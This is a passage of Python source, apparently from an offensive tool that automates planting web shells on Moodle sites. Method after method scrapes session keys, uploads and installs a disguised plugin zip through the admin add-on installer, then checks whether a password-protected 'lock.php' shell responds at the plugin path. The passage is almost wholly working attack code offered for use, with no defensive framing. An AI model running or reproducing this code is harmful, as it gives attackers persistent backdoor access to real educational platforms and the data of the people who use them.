            if self.CheckShell(self.url.replace("/login/index.php", "") + "/files/converter/onlyoffice/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellCacheStore(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-cachestore_rediscluster-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/cache/stores/rediscluster/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellCacheLock(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-cachelock_rediscluster-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/cache/locks/rediscluster/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellPlagiarism(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-plagiarism_originality-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/plagiarism/originality/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellSearchEngine(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-search_elastic-MOODLE_310_STABLE.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/search/engine/elastic/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellPortfolio(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-portfolio_evernote-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/portfolio/evernote/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellRepository(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-repository_alfresco-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/repository/alfresco/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellWebservice(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-webservice_restful-MOODLE_402_STABLE.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/webservice/restful/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellMLBackends(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-mlbackend_lmswithaipython-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/lib/mlbackend/lmswithaipython/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellGradingForm(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-gradingform_checklist-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/grade/grading/form/checklist/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellGradeReport(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-gradereport_rubrics-MOODLE_401_DEVELOPMENT.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
